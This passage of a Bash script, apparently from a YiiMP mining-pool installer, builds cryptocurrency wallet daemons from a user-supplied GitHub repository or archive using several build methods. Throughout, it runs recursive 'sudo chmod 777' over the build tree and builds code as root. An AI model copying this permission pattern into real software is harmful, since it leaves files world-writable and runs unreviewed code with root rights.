#!/usr/bin/env bash
#####################################################
# Created by Vaudois
# Source to compile wallets
#####################################################

source /etc/coinbuild.sh
source ${absolutepath}/${installtoserver}/conf/info.sh

YIIMPOLL=/etc/yiimpool.conf
if [[ -f "$YIIMPOLL" ]]; then
	source /etc/yiimpool.conf
	YIIMPCONF=true
fi

YIIMPSERVER=/etc/yiimpserver.conf
if [[ -f "$YIIMPSERVER" ]]; then
	source /etc/yiimpserver.conf
	YIIMPCONF=true
fi

CREATECOIN=true

# Set what we need
now=$(date +"%m_%d_%Y")
#set -e
# old numbers of all cpu = NPROC=$(nproc) // use all if problem to compile new command use all -1
NPROCPU=$(nproc)

if [[ ("${NPROCPU}" -le "3") ]]; then
        NPROC="1"
else
	NPROC="$((NPROCPU-"2"))"
fi
# Create the temporary installation directory if it doesn't already exist.
echo
echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
echo -e "$YELLOW   Creating the temporary build folder... 									$COL_RESET"
echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"

source ${absolutepath}/${installtoserver}/daemon_builder/.my.cnf

if [[ ! -e "${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds" ]]; then
	sudo mkdir -p ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds
else
	sudo rm -rf ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/*
	echo
	echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
	echo -e "$GREEN   temp_coin_builds already exists.... Skipping 								$COL_RESET"
	echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
fi
# Just double checking folder permissions
sudo setfacl -m u:${USERSERVER}:rwx ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds
cd ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds

# Get the github information
	input_box " COIN NAME " \
	"Enter the SIYMBOL of coin.
	\n\nExample: BTC
	\n\n*Paste press CTRL and right bottom Mouse.
	\n\nCoin name:" \
	"" \
	coin
	
	convertlistalgos=$(find ${PATH_STRATUM}/config/ -mindepth 1 -maxdepth 1 -type f -not -name '.*' -not -name '*.sh' -not -name '*.log' -not -name 'stratum.*' -not -name '*.*.*' -iname '*.conf' -execdir basename -s '.conf' {} +);
	optionslistalgos=$(echo -e "${convertlistalgos}" | awk '{ printf "%s on\n", $1}' | sort | uniq | grep [[:alnum:]])

	DIALOGFORLISTALGOS=${DIALOGFORLISTALGOS=dialog}
	tempfile=`tempfile 2>/dev/null` || tempfile=/tmp/test$$
	trap "rm -f $tempfile" 0 1 2 5 15

	$DIALOGFORLISTALGOS --colors --title "\Zb\Zr\Z7| Select the algorithm for coin: \Zn\ZR\ZB\Z0${coin^^}\Zn\Zb\Zr\Z7 |" --clear --colors --no-items --nocancel --shadow \
			--radiolist "\n\
	\ZB\Z1Hello, choose the algorithm for your coin\n\
	the list scrolls so you can use the \n\
	UP/DOWN arrow keys, the first letter of the choice as \n\
	hotkey or number keys 1-9 to choose an option. \n\
	Press SPACE to select an option.\Zn\n\n\
		What is your algorithm? choose from the following..." \
		55 60 47 $optionslistalgos 2> $tempfile
	retvalalgoselected=$?
	ALGOSELECTED=`cat $tempfile`
	case $retvalalgoselected in
	  0)
		coinalgo="${ALGOSELECTED}";;
	  1)
		echo
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   Cancel pressed STOP of installation! use coinbuild to new start!				$COL_RESET"
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		exit;;
	  255)
		echo
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   ESC pressed STOP of installation! use coinbuild to new start!				$COL_RESET"
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		exit;;
	esac

if [[ ("${precompiled}" == "true") ]]; then
	input_box " PRECOMPILED COIN " \
	"Paste url coin precompiled file format compressed!
	\n\nFormat *.tar.gz OR *.zip
	\n\nCoin url link:" \
	"" \
	coin_precompiled
else
	input_box " GITHUB LINK " \
	"Paste url coin link from github
	\n\nhttps://github.com/example-repo-name/coin-wallet.git
	\n\nCoin url link:" \
	"" \
	git_hub

	dialog --title " Switch To develeppement " \
	--yesno "Switch from main repo git in to develop ?
	Selecting Yes use Git develeppements." 6 50
	response=$?
	case $response in
	   0) swithdevelop=yes;;
	   1) swithdevelop=no;;
	   255) echo "[ESC] key pressed.";;
	esac

	if [[ ("${swithdevelop}" == "no") ]]; then

		dialog --title " Use a specific branch " \
		--yesno "Do you need to use a specific github branch of the coin?
		Selecting Yes use a selected version Git." 7 60
		response=$?
		case $response in
		   0) branch_git_hub=yes;;
		   1) branch_git_hub=no;;
		   255) echo "[ESC] key pressed.";;
		esac

		if [[ ("${branch_git_hub}" == "yes") ]]; then

			input_box " Branch Version " \
			"Please enter the branch name exactly as in github
			\n\nExample v2.5.1
			\n\nBranch version:" \
			"" \
			branch_git_hub_ver
		fi
	fi
fi

set -e
clear
echo
echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
echo -e "$GREEN   Starting installation coin : ${coin^^}							$COL_RESET"
echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"

coindir=$coin$now

# save last coin information in case coin build fails
echo '
lastcoin='"${coindir}"'
' | sudo -E tee ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/.lastcoin.conf >/dev/null 2>&1

# Clone the coin
if [[ ! -e $coindir ]]; then
	if [[ ("$precompiled" == "true") ]]; then
		mkdir $coindir
		cd "${coindir}"
		sudo wget $coin_precompiled
	else
		git clone $git_hub $coindir
		cd "${coindir}"
	fi

	if [[ ("${branch_git_hub}" == "yes") ]]; then
	  git fetch
	  git checkout "$branch_git_hub_ver"
	fi

	if [[ ("${swithdevelop}" == "yes") ]]; then
	  git checkout develop
	fi
	errorexist="false"
else
echo
	message_box " Coin already exist temp folder " \
	"${coindir} already exists.... in temp folder Skipping Installation!
	\n\nIf there was an error in the build use the build error options on the installer."

	errorexist="true"
	exit 0
fi

if [[("${errorexist}" == "false")]]; then
	sudo chmod -R 777 ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}
	sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type d -exec chmod 777 {} \; 
	sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type f -exec chmod 777 {} \;
fi

# Build the coin under the proper configuration
if [[ ("$autogen" == "true") ]]; then

	# Build the coin under berkeley 4.8
	if [[ ("$berkeley" == "4.8") ]]; then
		echo
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   Starting Building coin $MAGENTA ${coin^^} $COL_RESET using Berkeley 4.8	$COL_RESET"
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo
		basedir=$(pwd)

		FILEAUTOGEN=${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/autogen.sh
		if [[ ! -f "$FILEAUTOGEN" ]]; then
			echo -e "$YELLOW"
			find . -maxdepth 1 -type d \( -perm -1 -o \( -perm -10 -o -perm -100 \) \) -printf "%f\n"
			echo -e "$COL_RESET$MAGENTA"
			read -r -e -p "Where is the folder that contains the installation ${coin^^}, example bitcoin :" repotherinstall
			echo -e "$COL_RESET"
			echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
			echo -e "$GREEN   Moving files and Starting Building coin $MAGENTA ${coin^^} 					$COL_RESET"
			echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
			echo

			sudo mv ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/${repotherinstall}/* ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}
			sleep 3
		fi

		sh autogen.sh

		if [[ ! -e "${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/share/genbuild.sh" ]]; then
		  echo "genbuild.sh not found skipping"
		else
			sudo chmod 777 ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/share/genbuild.sh
		fi
		if [[ ! -e "${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/leveldb/build_detect_platform" ]]; then
		  echo "build_detect_platform not found skipping"
		else
		sudo chmod 777 ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/leveldb/build_detect_platform
		fi
		echo
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   Starting configure coin...													$COL_RESET"
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo
		sleep 2
		./configure CPPFLAGS="-I${absolutepath}/${installtoserver}/berkeley/db4/include -O2" LDFLAGS="-L${absolutepath}/${installtoserver}/berkeley/db4/lib" --with-incompatible-bdb --without-gui --disable-tests
		echo
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   Starting make coin...															$COL_RESET"
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo
		sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type d -exec chmod 777 {} \; 
		sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type f -exec chmod 777 {} \;
		sleep 3
		# make install
		TMP=$(mktemp)
		sudo make -j${NPROC} 2>&1 | tee $TMP
		OUTPUT=$(cat $TMP)
		echo $OUTPUT
		rm $TMP
	fi

	# Build the coin under berkeley 5.1
	if [[ ("$berkeley" == "5.1") ]]; then
		echo
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   Starting Building coin $MAGENTA ${coin^^} $COL_RESET using Berkeley 5.1	$COL_RESET"
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo
		basedir=$(pwd)

		FILEAUTOGEN=${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/autogen.sh
		if [[ ! -f "$FILEAUTOGEN" ]]; then
			echo -e "$YELLOW"
			find . -maxdepth 1 -type d \( -perm -1 -o \( -perm -10 -o -perm -100 \) \) -printf "%f\n"
			echo -e "$COL_RESET$MAGENTA"
			read -r -e -p "Where is the folder that contains the installation ${coin^^}, example bitcoin :" repotherinstall
			echo -e "$COL_RESET"
			echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
			echo -e "$GREEN   Moving files and Starting Building coin $MAGENTA ${coin^^} 					$COL_RESET"
			echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
			echo

			sudo mv ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/${repotherinstall}/* ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}
			sleep 3
		fi

		sh autogen.sh

		if [[ ! -e "${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/share/genbuild.sh" ]]; then
			echo "genbuild.sh not found skipping"
		else
			sudo chmod 777 ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/share/genbuild.sh
		fi

		if [[ ! -e "${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/leveldb/build_detect_platform" ]]; then
			echo "build_detect_platform not found skipping"
		else
			sudo chmod 777 ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/leveldb/build_detect_platform
		fi
		echo
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   Starting configure coin...													$COL_RESET"
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo
		sleep 2
		./configure CPPFLAGS="-I${absolutepath}/${installtoserver}/berkeley/db5/include -O2" LDFLAGS="-L${absolutepath}/${installtoserver}/berkeley/db5/lib" --with-incompatible-bdb --without-gui --disable-tests
		echo
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   Starting make coin...															$COL_RESET"
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo
		sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type d -exec chmod 777 {} \; 
		sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type f -exec chmod 777 {} \;
		sleep 3
		# make install
		TMP=$(mktemp)
		sudo make -j${NPROC} 2>&1 | tee $TMP
		OUTPUT=$(cat $TMP)
		echo $OUTPUT
		rm $TMP
	fi

	# Build the coin under berkeley 5.3
	if [[ ("$berkeley" == "5.3") ]]; then
		echo
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   Starting Building coin $MAGENTA ${coin^^} $COL_RESET using Berkeley 5.3	$COL_RESET"
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo
		basedir=$(pwd)

		FILEAUTOGEN=${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/autogen.sh
		if [[ ! -f "$FILEAUTOGEN" ]]; then
			echo -e "$YELLOW"
			find . -maxdepth 1 -type d \( -perm -1 -o \( -perm -10 -o -perm -100 \) \) -printf "%f\n"
			echo -e "$COL_RESET$MAGENTA"
			read -r -e -p "Where is the folder that contains the installation ${coin^^}, example bitcoin :" repotherinstall
			echo -e "$COL_RESET"
			echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
			echo -e "$GREEN   Moving files and Starting Building coin $MAGENTA ${coin^^} 					$COL_RESET"
			echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
			echo

			sudo mv ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/${repotherinstall}/* ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}
			sleep 3
		fi

		sh autogen.sh

		if [[ ! -e "${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/share/genbuild.sh" ]]; then
			echo "genbuild.sh not found skipping"
		else
			sudo chmod 777 ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/share/genbuild.sh
		fi

		if [[ ! -e "${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/leveldb/build_detect_platform" ]]; then
			echo "build_detect_platform not found skipping"
		else
			sudo chmod 777 ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/leveldb/build_detect_platform
		fi
		echo
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   Starting configure coin...													$COL_RESET"
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo
		sleep 2
		./configure CPPFLAGS="-I${absolutepath}/${installtoserver}/berkeley/db5.3/include -O2" LDFLAGS="-L${absolutepath}/${installtoserver}/berkeley/db5.3/lib" --with-incompatible-bdb --without-gui --disable-tests
		echo
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   Starting make coin...															$COL_RESET"
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo
		sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type d -exec chmod 777 {} \; 
		sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type f -exec chmod 777 {} \;
		sleep 3
		# make install
		TMP=$(mktemp)
		sudo make -j${NPROC} 2>&1 | tee $TMP
		OUTPUT=$(cat $TMP)
		echo $OUTPUT
		rm $TMP
	fi

	# Build the coin under berkeley 6.2
	if [[ ("$berkeley" == "6.2") ]]; then
		echo
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   Starting Building coin $MAGENTA ${coin^^} $COL_RESET using Berkeley 6.2	$COL_RESET"
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo
		basedir=$(pwd)

		FILEAUTOGEN=${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/autogen.sh
		if [[ ! -f "$FILEAUTOGEN" ]]; then
			echo -e "$YELLOW"
			find . -maxdepth 1 -type d \( -perm -1 -o \( -perm -10 -o -perm -100 \) \) -printf "%f\n"
			echo -e "$COL_RESET$MAGENTA"
			read -r -e -p "Where is the folder that contains the installation ${coin^^}, example bitcoin :" repotherinstall
			echo -e "$COL_RESET"
			echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
			echo -e "$GREEN   Moving files and Starting Building coin $MAGENTA ${coin^^} 					$COL_RESET"
			echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
			echo

			sudo mv ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/${repotherinstall}/* ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}
			sleep 3
		fi

		sh autogen.sh

		if [[ ! -e "${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/share/genbuild.sh" ]]; then
			echo "genbuild.sh not found skipping"
		else
			sudo chmod 777 ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/share/genbuild.sh
		fi

		if [[ ! -e "${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/leveldb/build_detect_platform" ]]; then
			echo "build_detect_platform not found skipping"
		else
			sudo chmod 777 ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src/leveldb/build_detect_platform
		fi
		echo
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   Starting configure coin...													$COL_RESET"
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo
		sleep 2
		./configure CPPFLAGS="-I${absolutepath}/${installtoserver}/berkeley/db6.2/include -O2" LDFLAGS="-L${absolutepath}/${installtoserver}/berkeley/db6.2/lib" --with-incompatible-bdb --without-gui --disable-tests
		echo
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   Starting make coin...															$COL_RESET"
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo
		sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type d -exec chmod 777 {} \; 
		sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type f -exec chmod 777 {} \;
		sleep 3
		# make install
		TMP=$(mktemp)
		sudo make -j${NPROC} 2>&1 | tee $TMP
		OUTPUT=$(cat $TMP)
		echo $OUTPUT
		rm $TMP
	fi

	# Build the coin under UTIL directory with BUILD.SH file
	if [[ ("$buildutil" == "true") ]]; then
		echo
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   Starting Building $MAGENTA ${coin^^} $COL_RESET using UTIL directory contains BUILD.SH	$COL_RESET"
		echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
		echo
		basedir=$(pwd)

		FILEAUTOGEN=${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/autogen.sh
		if [[ ! -f "$FILEAUTOGEN" ]]; then
			echo -e "$YELLOW"
			find . -maxdepth 1 -type d \( -perm -1 -o \( -perm -10 -o -perm -100 \) \) -printf "%f\n"
			echo -e "$COL_RESET$MAGENTA"
			read -r -e -p "Where is the folder that contains the installation ${coin^^}, example bitcoin :" repotherinstall
			echo -e "$COL_RESET"
			echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
			echo -e "$GREEN   Moving files and Starting Building coin $MAGENTA ${coin^^} 					$COL_RESET"
			echo -e "$CYAN ------------------------------------------------------------------------------- 	$COL_RESET"
			echo

			sudo mv ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/${repotherinstall}/* ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}
			sleep 3
		fi

		sh autogen.sh

		find . -maxdepth 1 -type d \( -perm -1 -o \( -perm -10 -o -perm -100 \) \) -printf "%f\n"
		read -r -e -p "where is the folder that contains the BUILD.SH installation file, example xxutil :" reputil
		cd ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/${reputil}
		echo ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/${reputil}
		sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type d -exec chmod 777 {} \; 
		sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type f -exec chmod 777 {} \;
		sleep 3
		sudo bash build.sh -j$(nproc)

		if [[ ! -e "${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/${reputil}/fetch-params.sh" ]]; then
			echo "fetch-params.sh not found skipping"
		else
			sh fetch-params.sh
		fi
	fi

else

	# Build the coin under cmake
	if [[ ("$cmake" == "true") ]]; then
		clear
		DEPENDS="${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/depends"

		# Build the coin under depends present
		if [ -d "$DEPENDS" ]; then
			echo
			echo
			echo -e "$CYAN => Building using cmake with DEPENDS directory... $COL_RESET"
			echo
			sleep 3

			echo
			echo
			read -r -e -p "Hide LOG from to Work Coin ? [y/N] :" ifhidework
			echo

			# Executing make on depends directory
			echo
			echo -e "$YELLOW => executing make on depends directory... $COL_RESET"
			echo
			sleep 3
			cd ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/depends
			if [[ ("$ifhidework" == "y" || "$ifhidework" == "Y") ]]; then
				sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type d -exec chmod 777 {} \; 
				sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type f -exec chmod 777 {} \;
				sleep 3
				# make install
				TMP=$(mktemp)
				hide_output make -j${NPROC} 2>&1 | tee $TMP
				OUTPUT=$(cat $TMP)
				echo $OUTPUT
				rm $TMP
			else
				echo
				echo -e "$CYAN --------------------------------------------------------------------------- 	$COL_RESET"
				echo -e "$GREEN   Starting make coin...														$COL_RESET"
				echo -e "$CYAN --------------------------------------------------------------------------- 	$COL_RESET"
				echo
				sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type d -exec chmod 777 {} \; 
				sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type f -exec chmod 777 {} \;
				sleep 3
				# make install
				TMP=$(mktemp)
				sudo make -j${NPROC} 2>&1 | tee $TMP
				OUTPUT=$(cat $TMP)
				echo $OUTPUT
				rm $TMP
			fi
			echo
			echo
			echo -e "$GREEN Done...$COL_RESET"

			# Building autogen....
			echo
			echo -e "$CYAN --------------------------------------------------------------------------- 	$COL_RESET"
			echo -e "$GREEN   Starting Building coin $MAGENTA ${coin^^} $COL_RESET using autogen...		$COL_RESET"
			echo -e "$CYAN --------------------------------------------------------------------------- 	$COL_RESET"
			echo
			sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type d -exec chmod 777 {} \; 
			sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type f -exec chmod 777 {} \;
			sleep 3
			cd ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}
			if [[ ("$ifhidework" == "y" || "$ifhidework" == "Y") ]]; then
				hide_output sh autogen.sh
			else
				sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type d -exec chmod 777 {} \; 
				sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type f -exec chmod 777 {} \;
				sleep 3
				sh autogen.sh
			fi
			echo
			echo
			echo -e "$GREEN Done...$COL_RESET"

			# Configure with your platform....
			if [ -d "$DEPENDS/i686-pc-linux-gnu" ]; then
				echo
				echo -e "$YELLOW => Configure with i686-pc-linux-gnu... $COL_RESET"
				echo
				sleep 3
				if [[ ("$ifhidework" == "y" || "$ifhidework" == "Y") ]]; then
					hide_output ./configure --with-incompatible-bdb --prefix=`pwd`/depends/i686-pc-linux-gnu
				else
					./configure --with-incompatible-bdb --prefix=`pwd`/depends/i686-pc-linux-gnu
				fi
			elif [ -d "$DEPENDS/x86_64-pc-linux-gnu/" ]; then
				echo
				echo -e "$YELLOW => Configure with x86_64-pc-linux-gnu... $COL_RESET"
				echo
				sleep 3
				if [[ ("$ifhidework" == "y" || "$ifhidework" == "Y") ]]; then
					hide_output ./configure --with-incompatible-bdb --prefix=`pwd`/depends/x86_64-pc-linux-gnu
				else
					./configure --with-incompatible-bdb --prefix=`pwd`/depends/x86_64-pc-linux-gnu
				fi
			elif [ -d "$DEPENDS/i686-w64-mingw32/" ]; then
				echo
				echo -e "$YELLOW => Configure with i686-w64-mingw32... $COL_RESET"
				echo
				sleep 3
				if [[ ("$ifhidework" == "y" || "$ifhidework" == "Y") ]]; then
					hide_output ./configure --with-incompatible-bdb --prefix=`pwd`/depends/i686-w64-mingw32
				else
					./configure --with-incompatible-bdb --prefix=`pwd`/depends/i686-w64-mingw32
				fi
			elif [ -d "$DEPENDS/x86_64-w64-mingw32/" ]; then
				echo
				echo -e "$YELLOW => Configure with x86_64-w64-mingw32... $COL_RESET"
				echo
				sleep 3
				if [[ ("$ifhidework" == "y" || "$ifhidework" == "Y") ]]; then
					hide_output ./configure --with-incompatible-bdb --prefix=`pwd`/depends/x86_64-w64-mingw32
				else
					./configure --with-incompatible-bdb --prefix=`pwd`/depends/x86_64-w64-mingw32
				fi
			elif [ -d "$DEPENDS/x86_64-apple-darwin14/" ]; then
				echo
				echo -e "$YELLOW => Configure with x86_64-apple-darwin14... $COL_RESET"
				echo
				sleep 3
				if [[ ("$ifhidework" == "y" || "$ifhidework" == "Y") ]]; then
					hide_output ./configure --with-incompatible-bdb --prefix=`pwd`/depends/x86_64-apple-darwin14
				else
					./configure --with-incompatible-bdb --prefix=`pwd`/depends/x86_64-apple-darwin14
				fi
			elif [ -d "$DEPENDS/arm-linux-gnueabihf/" ]; then
				echo
				echo -e "$YELLOW => Configure with arm-linux-gnueabihf... $COL_RESET"
				echo
				sleep 3
				if [[ ("$ifhidework" == "y" || "$ifhidework" == "Y") ]]; then
					hide_output ./configure --with-incompatible-bdb --prefix=`pwd`/depends/arm-linux-gnueabihf
				else
					./configure --with-incompatible-bdb --prefix=`pwd`/depends/arm-linux-gnueabihf
				fi
			elif [ -d "$DEPENDS/aarch64-linux-gnu/" ]; then
				echo
				echo -e "$YELLOW => Configure with aarch64-linux-gnu... $COL_RESET"
				echo
				sleep 3
				if [[ ("$ifhidework" == "y" || "$ifhidework" == "Y") ]]; then
					hide_output ./configure --with-incompatible-bdb --prefix=`pwd`/depends/aarch64-linux-gnu
				else
					./configure --with-incompatible-bdb --prefix=`pwd`/depends/aarch64-linux-gnu
				fi
			fi
			echo
			echo
			echo -e "$GREEN Done...$COL_RESET"

			# Executing make to finalize....
			echo
			echo -e "$YELLOW => Executing make to finalize... $COL_RESET"
			echo
			sleep 3
			if [[ ("$ifhidework" == "y" || "$ifhidework" == "Y") ]]; then
			# make install
			TMP=$(mktemp)
			hide_output make -j${NPROC} 2>&1 | tee $TMP
			OUTPUT=$(cat $TMP)
			echo $OUTPUT
			rm $TMP
			else
			echo
			echo -e "$CYAN --------------------------------------------------------------------------- 	$COL_RESET"
			echo -e "$GREEN   Starting make coin...														$COL_RESET"
			echo -e "$CYAN --------------------------------------------------------------------------- 	$COL_RESET"
			echo
			sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type d -exec chmod 777 {} \; 
			sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type f -exec chmod 777 {} \;
			sleep 3
			# make install
			TMP=$(mktemp)
			sudo make -j${NPROC} 2>&1 | tee $TMP
			OUTPUT=$(cat $TMP)
			echo $OUTPUT
			rm $TMP
			fi
			echo
			echo
			echo -e "$GREEN Done...$COL_RESET"
		else
			echo
			echo -e "$CYAN --------------------------------------------------------------------------- 	$COL_RESET"
			echo -e "$GREEN   Starting Building coin $MAGENTA ${coin^^} $COL_RESET using Cmake method	$COL_RESET"
			echo -e "$CYAN --------------------------------------------------------------------------- 	$COL_RESET"
			echo
			sleep 3
			cd ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir} && git submodule init && git submodule update

			echo
			echo -e "$CYAN --------------------------------------------------------------------------- 	$COL_RESET"
			echo -e "$GREEN   Starting make coin...														$COL_RESET"
			echo -e "$CYAN --------------------------------------------------------------------------- 	$COL_RESET"
			echo
			sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type d -exec chmod 777 {} \; 
			sudo find ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/ -type f -exec chmod 777 {} \;
			sleep 3
			# make install
			TMP=$(mktemp)
			sudo make -j${NPROC} 2>&1 | tee $TMP
			OUTPUT=$(cat $TMP)
			echo $OUTPUT
			rm $TMP
			sleep 3
		fi
	fi

	# Build the coin under unix
	if [[ ("$unix" == "true") ]]; then
		echo
		echo -e "$CYAN ----------------------------------------------------------------------------------- 	$COL_RESET"
		echo -e "$GREEN   Starting Building coin $MAGENTA ${coin^^} $COL_RESET	using makefile.unix method	$COL_RESET"
		echo -e "$CYAN ----------------------------------------------------------------------------------- 	$COL_RESET"
		echo
		cd ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds/${coindir}/src

